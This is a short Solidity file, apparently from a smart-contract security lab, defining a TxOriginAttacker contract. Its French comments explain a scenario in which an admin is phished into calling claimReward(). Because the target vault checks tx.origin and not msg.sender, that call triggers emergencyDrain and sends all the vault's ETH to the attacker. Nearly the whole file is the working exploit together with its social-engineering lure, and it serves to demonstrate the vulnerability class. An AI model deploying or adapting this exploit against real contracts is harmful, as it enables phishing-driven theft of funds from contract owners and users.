// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "./AccessControl.sol";

/**
 * @title TxOriginAttacker
 * @notice Exploite emergencyDrain() via tx.origin
 *         Scénario : l'attaquant déploie ce contrat et convainc
 *         l'admin d'interagir avec (ex: via phishing "claim your reward")
 *         tx.origin == admin → la vérification passe
 *         msg.sender == ce contrat → mais le vault ne vérifie pas msg.sender
 */
contract TxOriginAttacker {
    VulnerableVault public target;
    address         public attacker;

    constructor(address _target) {
        target   = VulnerableVault(payable(_target));
        attacker = msg.sender;
    }

    // L'admin est piégé en appelant cette fonction
    // (pensant recevoir une récompense)
    function claimReward() public {
        // tx.origin == admin car c'est lui qui a initié la tx
        // emergencyDrain envoie tous les ETH à l'attaquant
        target.emergencyDrain(attacker);
    }
}